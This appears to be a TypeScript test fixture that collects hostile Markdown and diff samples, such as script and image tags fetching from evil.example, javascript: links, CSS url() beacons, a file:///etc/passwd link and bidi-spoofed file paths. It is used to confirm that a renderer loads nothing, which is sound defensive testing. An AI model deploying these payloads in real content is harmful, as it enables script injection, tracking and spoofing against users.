// 07「不可信内容」的恶意样本集（P11 ③）：每条都不许发出任何网络请求。单测（test/render.test.ts）和桌面自检页（app/selftest.tsx）共用。
// 域名用保留的 .example / .invalid，不会解析到任何人。
const E = 'https://evil.example'
export const EVIL_SAMPLES: { id: string; md: string }[] = [
  { id: 'md-image', md: `![远程图](${E}/1.png)` },
  { id: 'md-image-ref', md: `![引用图][r]\n\n[r]: ${E}/2.png` },
  { id: 'md-image-data', md: '![data 图](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==)' },
  { id: 'html-img', md: `<img src="${E}/3.png" onerror="fetch('${E}/x')">` },
  { id: 'html-img-inline', md: `文字 <img src="${E}/4.png"> 文字` },
  { id: 'html-script', md: `<script src="${E}/5.js"></script><script>fetch('${E}/6')</script>` },
  { id: 'html-iframe', md: `<iframe src="${E}/7"></iframe>` },
  { id: 'html-css-url', md: `<div style="background:url(${E}/8.png)">背景</div>` },
  { id: 'html-style-import', md: `<style>@import url(${E}/9.css); body{background:url(${E}/10.png)}</style>` },
  { id: 'html-link-css', md: `<link rel="stylesheet" href="${E}/11.css"><link rel="prefetch" href="${E}/12">` },
  { id: 'html-media', md: `<video src="${E}/13.mp4" autoplay></video><audio src="${E}/14.mp3" autoplay></audio>` },
  { id: 'html-object', md: `<object data="${E}/15"></object><embed src="${E}/16">` },
  { id: 'html-svg', md: `<svg><image href="${E}/17.png"/></svg>` },
  { id: 'html-meta', md: `<meta http-equiv="refresh" content="0;url=${E}/18"><base href="${E}/">` },
  { id: 'html-a-ping', md: `<a href="${E}/19" ping="${E}/20">ping</a>` },
  { id: 'js-link', md: '[点我](javascript:fetch(\'https://evil.example/21\'))' },
  { id: 'js-link-case', md: '[点我](JaVaScRiPt:alert(1))' },
  { id: 'data-link', md: '[数据](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)' },
  { id: 'vbs-file-link', md: '[a](vbscript:msgbox) [b](file:///etc/passwd)' },
  { id: 'long-url', md: `[长](${E}/${'a'.repeat(5000)}) ${E}/${'b'.repeat(3000)}` },
  { id: 'autolink', md: `<${E}/22> 和裸链接 ${E}/23` },
  { id: 'deceptive', md: `[https://good.example/login](${E}/24)` },
  { id: 'code-with-html', md: '```html\n<img src="https://evil.example/25.png">\n<script src="https://evil.example/26.js"></script>\n```' },
  { id: 'streaming-half-link', md: `正在流 [半截](${E}/27` },
  { id: 'streaming-half-image', md: `正在流 ![半截图](${E}/28.png` },
  { id: 'entity-js', md: '[x](&#106;avascript:alert(1))' },
  { id: 'css-in-md-table', md: `| a |\n|---|\n| <span style="background:url(${E}/29.png)">x</span> |` },
]

// W4: hostile diffs (07 「diff」): HTML and scripts in lines and in file names, javascript: links, bidi overrides and
// zero-width characters in paths. Rendered on the selftest page through DiffView (desktop: @pierre/diffs) with every
// file open; nothing may load.
export const EVIL_DIFFS: { id: string; diff: string }[] = [
  { id: 'diff-html-lines', diff: [
    'diff --git a/README.md b/README.md', '--- a/README.md', '+++ b/README.md', '@@ -1,2 +1,3 @@',
    `-<img src="${E}/d1.png" onerror="fetch('${E}/d2')">`,
    `+<script src="${E}/d3.js"></script><script>fetch('${E}/d4')</script>`,
    `+<iframe src="${E}/d5"></iframe><link rel="stylesheet" href="${E}/d6.css"><style>@import url(${E}/d7.css)</style>`,
    `+[点我](javascript:fetch('${E}/d8')) <a href="javascript:alert(1)">x</a> <svg><image href="${E}/d9.png"/></svg>`,
  ].join('\n') },
  { id: 'diff-html-names', diff: [
    `diff --git a/<img src=${E}/d10.png>.ts b/<img src=${E}/d10.png>.ts`,
    `--- a/<img src=${E}/d10.png>.ts`, `+++ b/<img src=${E}/d10.png>.ts`, '@@ -1 +1 @@', '-a', `+<video src="${E}/d11.mp4" autoplay></video>`,
    'diff --git a/x.js b/<script>alert(1)<\/script>.js', 'rename from x.js', 'rename to <script>alert(1)<\/script>.js',
  ].join('\n') },
  { id: 'diff-bidi-path', diff: [
    'diff --git a/src/safe\u202egpj.ts b/src/safe\u202egpj.ts', '--- a/src/safe\u202egpj.ts', '+++ b/src/safe\u202egpj.ts',
    '@@ -1 +1 @@', '-const ok = true', '+const ok = false \u2067// \u2066looks fine\u2069\u200b',
  ].join('\n') },
  { id: 'diff-css-in-code', diff: [
    '--- a/style.css', '+++ b/style.css', '@@ -1 +1 @@', '-body{}', `+body{background:url(${E}/d12.png)} @font-face{src:url(${E}/d13.woff)}`,
  ].join('\n') },
]

export const EVIL_HOST = 'evil.example'
